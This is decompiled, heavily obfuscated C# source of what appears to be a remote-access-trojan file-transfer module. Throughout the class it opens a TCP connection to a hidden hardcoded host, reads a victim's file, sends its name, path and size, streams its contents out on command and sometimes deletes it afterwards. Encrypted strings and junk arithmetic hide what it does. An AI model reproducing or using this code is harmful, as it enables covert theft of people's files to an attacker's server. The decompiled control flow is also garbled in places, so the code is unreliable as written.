using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

public class _____________________________________
{
	private delegate void ______________________________________(string string_0);

	public string __;

	public string ___;

	public int ____;

	public int _____;

	private TcpClient ______;

	private bool _______;

	private _____________________________________.______________________________________ ________;

	public System.IO.StreamWriter _________;

	public System.IO.StreamReader __________;

	private string ___________;

	public string ____________;

	private event _____________________________________.______________________________________ _
	{
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		add
		{
			this.________ = (_____________________________________.______________________________________)System.Delegate.Combine(this.________, value);
		}
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		remove
		{
			this.________ = (_____________________________________.______________________________________)System.Delegate.Remove(this.________, value);
		}
	}

	public _____________________________________()
	{
		this.____ = 1024;
		this._____ = 0;
		this._______ = false;
		this.___________ = <Module>._______<string>(363088510u);
		this.____________ = <Module>.______<string>(2103125196u);
	}

	public void ___(string string_0)
	{
		string arg_DA_0 = string_0;
		int arg_13_0 = 1073742047;
		int num = ______________________._______;
		int arg_D5_0 = ((arg_13_0 ^ num / 427613) == 0) ? (System.Type.EmptyTypes.Length + -1273139748) : (System.Type.EmptyTypes.Length + 24064);
		int num2 = <Module>._____________;
		int arg_D5_1;
		if ((num2 * 214 + 298 * num2) / 2134281 != -1056418411)
		{
			if (79683584 * num != -5380)
			{
				arg_D5_1 = ((1409286144 * num2 - 1468 + -4923 != -num2 + num2) ? (System.Type.EmptyTypes.Length + 25636) : (System.Type.EmptyTypes.Length + 1752630555));
			}
			else
			{
				int ______________ = <Module>._______________;
				arg_D5_1 = ((~(______________ << 6 | num * 262144) != 64 * -______________) ? 1190942287 : 861944032);
			}
		}
		else
		{
			arg_D5_1 = sizeof(ushort) + 1761230917;
		}
		string_0 = ___________________________________________________________________._(arg_DA_0, <Module>.__________(arg_D5_0, arg_D5_1, System.Type.EmptyTypes.Length + 199));
		try
		{
			while (true)
			{
				int num3;
				if (string_0.Contains(<Module>.____<string>(329123169u)))
				{
					this._________();
					num3 = sizeof(System.Guid) + -124;
				}
				num3 = -108;
				int arg_F4_0 = 6;
				int ________________ = <Module>._________________;
				if ((-(arg_F4_0 * ________________ + 58 * ________________) | -1001521152 * ________________) != -5906)
				{
					if (Operators.CompareString(string_0, <Module>.___<string>(616668267u), false) != 0)
					{
						goto IL_157;
					}
					if (num3 == -108)
					{
						break;
					}
				}
			}
			this._______();
			IL_157:
			if (string_0.Contains(<Module>.______<string>(2665689571u)))
			{
				string value = string_0.Replace(<Module>.___<string>(3245272701u), string.Empty);
				this._.Position = (long)System.Convert.ToInt32(value);
				this._________();
			}
		}
		catch (System.Exception expr_199)
		{
			ProjectData.SetProjectError(expr_199);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public void ____(byte[] byte_0)
	{
		try
		{
			System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(this._____(this.___________), 0, this.___________.Length);
			this.______.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (System.Exception expr_51)
		{
			ProjectData.SetProjectError(expr_51);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public byte[] _____(string string_0)
	{
		return System.Text.Encoding.Default.GetBytes(string_0);
	}

	public string ______(byte[] byte_0)
	{
		return System.Text.Encoding.Default.GetString(byte_0);
	}

	public void _______()
	{
		int num2;
		int num4;
		try
		{
			IL_00:
			int arg_37_0 = -18812;
			int arg_0E_0 = 53;
			int num = <Module>.____________;
			if (arg_37_0 != (((arg_0E_0 * num + 11 * num ^ 8806) != 0) ? (System.Type.EmptyTypes.Length + -18813) : (sizeof(byte) + 1524028807)))
			{
			}
			int num3;
			do
			{
				ProjectData.ClearProjectError();
				num2 = 1;
				IL_3B:
				num3 = 2;
				this._.Close();
			}
			while (System.Type.EmptyTypes.Length + 29033 == -4831);
			IL_67:
			num3 = 3;
			this.______.Close();
			IL_75:
			num3 = 4;
			this._________.Close();
			IL_83:
			num3 = 5;
			this.__________.Close();
			IL_91:
			num3 = 6;
			System.Threading.Thread.CurrentThread.Abort();
			IL_9E:
			goto IL_10A;
			IL_A0:
			int arg_A5_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_A5_0);
			IL_CA:
			goto IL_FF;
			num4 = num3;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2);
			IL_DD:
			goto IL_FF;
		}
		object arg_DF_0;
		endfilter(arg_DF_0 is System.Exception & num2 != 0 & num4 == 0);
		IL_FF:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_10A:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void ________()
	{
		try
		{
			while (System.IO.File.Exists(this.__))
			{
				______________________________________________________________.______________(<Module>._______<string>(2779757176u), <Module>.___<string>(3104543174u) + this.__);
				int num = 24864;
				if (System.Type.EmptyTypes.Length + 27646 == 13788)
				{
					goto IL_91;
				}
				System.Threading.Thread.Sleep(500);
				this.______ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
				if (num != -7315)
				{
					goto IL_264;
				}
				if ((620685709 ^ -1944204288 * (num / 22855445) * (num + num)) == 0)
				{
					goto IL_264;
				}
				goto IL_211;
				int arg_B8_0;
				string[] array;
				int num2;
				while (true)
				{
					IL_B8:
					switch (arg_B8_0)
					{
					case 0:
						goto IL_296;
					case 1:
						array[1] = ______________________________________________________________.________________________;
						array[2] = <Module>.___<string>(2677394803u);
						num = -10767;
						arg_B8_0 = sizeof(double) + -6;
						continue;
					case 2:
						array[3] = System.IO.Path.GetFileName(this.__);
						array[4] = <Module>.______<string>(3060421691u);
						num2 = num;
						num = 26597;
						if (num2 == -209)
						{
							goto IL_264;
						}
						array[5] = this.__;
						array[6] = <Module>.___<string>(2677394803u);
						if (num != -15235)
						{
							goto IL_211;
						}
						break;
					case 3:
						goto IL_124;
					case 4:
						if (this._____ != 0)
						{
							this._.Position = (long)this._____;
							arg_B8_0 = System.Type.EmptyTypes.Length + 5;
							continue;
						}
						goto IL_91;
					case 5:
						goto IL_91;
					case 6:
						goto IL_DB;
					default:
						goto IL_124;
					}
					IL_15B:
					this.______.GetStream().BeginRead(new byte[]
					{
						0
					}, 0, 0, new System.AsyncCallback(this.___________), null);
					arg_B8_0 = System.Type.EmptyTypes.Length + 4;
					continue;
					IL_DB:
					if (this._______)
					{
						goto IL_15B;
					}
					this._______ = true;
					this._ += new _____________________________________.______________________________________(this.___);
					if (num != 30713)
					{
						goto IL_15B;
					}
					IL_124:
					this.______.SendBufferSize = 9999999;
					this._ = new System.IO.FileStream(this.__, System.IO.FileMode.Open, System.IO.FileAccess.Read, System.IO.FileShare.ReadWrite);
					num = (((num << 13) - 2907 != 2023036836) ? (System.Type.EmptyTypes.Length + -28414) : (System.Type.EmptyTypes.Length + 1680145965));
					goto IL_DB;
				}
				IL_296:
				array[8] = <Module>.____<string>(3008796200u);
				array[9] = this._.Position.ToString();
				if (5309 + num2 == -num2)
				{
					continue;
				}
				if (num != -15164)
				{
					continue;
				}
				array[10] = <Module>.______<string>(861631917u);
				array[11] = this.___;
				array[12] = <Module>._______<string>(3906612745u);
				string string_ = string.Concat(array);
				this.__________(string_);
				return;
				IL_91:
				System.Threading.Thread.Sleep(3500);
				array = new string[13];
				array[0] = <Module>.______<string>(664265857u);
				arg_B8_0 = System.Type.EmptyTypes.Length + 1;
				goto IL_B8;
				IL_211:
				array[7] = this._.Length.ToString();
				num = -15164;
				arg_B8_0 = System.Type.EmptyTypes.Length + 0;
				goto IL_B8;
				IL_264:
				this.______ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
				this.______.ReceiveBufferSize = 9999999;
				arg_B8_0 = System.Type.EmptyTypes.Length + 3;
				goto IL_B8;
			}
			______________________________________________________________.______________(<Module>._____<string>(3112419482u), <Module>._____<string>(784970147u) + this.__);
			System.Threading.Thread.Sleep(2000);
		}
		catch (System.Exception expr_34D)
		{
			ProjectData.SetProjectError(expr_34D);
			System.Exception ex = expr_34D;
			______________________________________________________________.______________(<Module>._____<string>(2571642080u), <Module>.___<string>(2721375231u) + ex.ToString());
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public void _________()
	{
		try
		{
			System.IO.MemoryStream memoryStream;
			while (true)
			{
				byte[] array = new byte[this.____ + 1];
				if (this._.Length - this._.Position < (long)array.Length)
				{
					goto IL_06;
				}
				goto IL_56;
				IL_43:
				int arg_43_0;
				switch (arg_43_0)
				{
				case 1:
				{
					int num2;
					int num;
					do
					{
						memoryStream = new System.IO.MemoryStream();
						string text = <Module>.___<string>(1874919422u) + this.____________;
						num = num2;
						num2 = 6505;
						if (num == 29603)
						{
							break;
						}
						memoryStream.Write(this._____(text), 0, text.Length);
						num = num2;
						num2 = -20573;
					}
					while (num == 28750);
					IL_D7:
					memoryStream.Write(array, 0, array.Length);
					if (num2 != -20573)
					{
						continue;
					}
					goto IL_11E;
					goto IL_D7;
				}
				case 2:
				{
					IL_56:
					this._.Read(array, 0, array.Length);
					int num2 = sizeof(short) + -18157;
					arg_43_0 = System.Type.EmptyTypes.Length + 1;
					goto IL_43;
				}
				}
				IL_06:
				long arg_26_0 = this._.Length;
				long arg_26_1 = this._.Position;
				<Module>._________________ = 1898371779;
				array = new byte[(int)(arg_26_0 - arg_26_1 - 1L) + 1];
				arg_43_0 = sizeof(double) + -6;
				goto IL_43;
			}
			IL_11E:
			this.____(memoryStream.ToArray());
			memoryStream.Dispose();
			if (this._.Length == this._.Position)
			{
				if (this.__.Contains(______________________._____))
				{
					System.IO.File.Delete(this.__);
				}
				System.Threading.Thread.Sleep(2000);
				this._______();
			}
		}
		catch (System.Exception expr_179)
		{
			ProjectData.SetProjectError(expr_179);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public void __________(string string_0)
	{
		try
		{
			this._________ = new System.IO.StreamWriter(this.______.GetStream());
			this._________.WriteLine(<Module>.______<string>(2701181849u) + string_0);
			this._________.Flush();
		}
		catch (System.Exception expr_3E)
		{
			ProjectData.SetProjectError(expr_3E);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public void ___________(System.IAsyncResult iasyncResult_0)
	{
		try
		{
			this.__________ = new System.IO.StreamReader(this.______.GetStream());
			_____________________________________.______________________________________ _____________________________________ = this.________;
			if (_____________________________________ != null)
			{
				_____________________________________(this.__________.ReadLine());
			}
			this.______.GetStream().BeginRead(new byte[]
			{
				0
			}, 0, 0, new System.AsyncCallback(this.___________), null);
		}
		catch (System.Exception expr_60)
		{
			ProjectData.SetProjectError(expr_60);
			this._______();
			ProjectData.ClearProjectError();
		}
	}
}
